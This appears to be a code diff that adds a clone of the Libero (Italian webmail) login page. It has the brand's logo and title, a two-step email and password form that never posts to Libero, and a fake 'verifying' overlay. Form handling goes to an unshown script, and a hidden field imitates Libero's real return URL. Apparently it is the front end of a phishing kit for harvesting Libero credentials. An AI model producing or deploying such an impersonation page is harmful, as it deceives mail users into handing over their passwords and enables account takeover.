@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Accedi - Libero</title>
+  <meta name="description" content="Accedi al tuo account Libero">
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>📧</text></svg>">
+  <link rel="stylesheet" href="/css/style.css">
+
+<script src="https://cdn.tailwindcss.com"></script>
+
+</head>
+<body>
+  <div id="app">
+ 
+
+    <!-- MAIN CONTENT -->
+    <main class="login-main">
+      <div class="login-card">
+      
+
+        <img class="logo" src="./assets/LIBERO Logo with Green Dot.png" alt="Libero Logo" title="Vai all'Home Page di Libero">
+        <div class="txt">Accedi</div>
+            
+          
+
+
+
+
+        <!-- STEP 1: EMAIL -->
+        <form id="email-form" name="autenticazione" method="post" onsubmit="return false;">
+          <input type="hidden" name="SERVICE_ID" value="webmail">
+          <input type="hidden" name="RET_URL" value="https://mail1.libero.it/appsuite/api/login?action=liberoLogin">
+          <input type="hidden" name="way" value="">
+
+          <label id="label_loginid" class="iol-material-textfield-outlined">
+            <input
+              name="LOGINID"
+              id="loginid"
+              type="email"
+              value=""
+              maxlength="256"
+              placeholder=" "
+              autocomplete="username email"
+              autofocus
+              required
+              pattern=".*"
+            >
+            <span class="floating-label">Inserisci la tua email</span>
+            <span id="loginid_error" class="txt-error" style="display:none"></span>
+          </label>
+
+          <button type="submit" class="iol-material-button-contained" id="form_submit">Avanti</button>
+
+       <div class="flex items-center w-full mt-6">
+    <label class="flex items-center gap-2 cursor-pointer select-none text-[13px] text-gray-700">
+        <input class="w-4 h-4 rounded border-gray-400 text-[#0066cc] focus:ring-0 cursor-pointer" type="checkbox" name="remember_me">
+        <span>Rimani collegato</span>
+    </label>
+    <a href="#help" class="ml-auto text-[13px] text-[#0066cc] hover:underline">Serve aiuto?</a>
+</div>
+
+<div class="create-account text-center mt-5">
+   Non hai un account? <a href="#"  style="color: #0066cc;  target = "_blank">Registrati ora</a>
+</div>
+
+
+
+        </form>
+
+        <!-- STEP 2: PASSWORD -->
+        <form id="password-form" name="password_auth" method="post" onsubmit="return false;" style="display:none;">
+         
+
+          <label id="label_password" class="iol-material-textfield-outlined">
+            <input
+              name="PASSWORD"
+              id="password"
+              type="password"
+              value=""
+              maxlength="128"
+              placeholder=" "
+              autocomplete="current-password"
+              required
+            >
+            <span class="floating-label">Inserisci la tua password</span>
+            <span id="password_error" class="txt-error" style="display:none"></span>
+          </label>
+
+          <div class="pw-actions">
+            <button type="submit" class="iol-material-button-contained" id="pw_submit">Accedi</button>
+            <a href="#" class="link-forgot" onclick="return false;">Password dimenticata?</a>
+          </div>
+
+
+
+
+
+        </form>
+
+        <!-- LOADING STATE -->
+        <div id="loading-overlay" style="display:none;">
+          <div class="spinner"></div>
+          <p>Verifica in corso...</p>
+        </div>
+      </div>
+
+    
+
+    
+    </main>
+
+   
+  </div>
+
+  <script src="/js/main.js"></script>
+</body>
+</html>
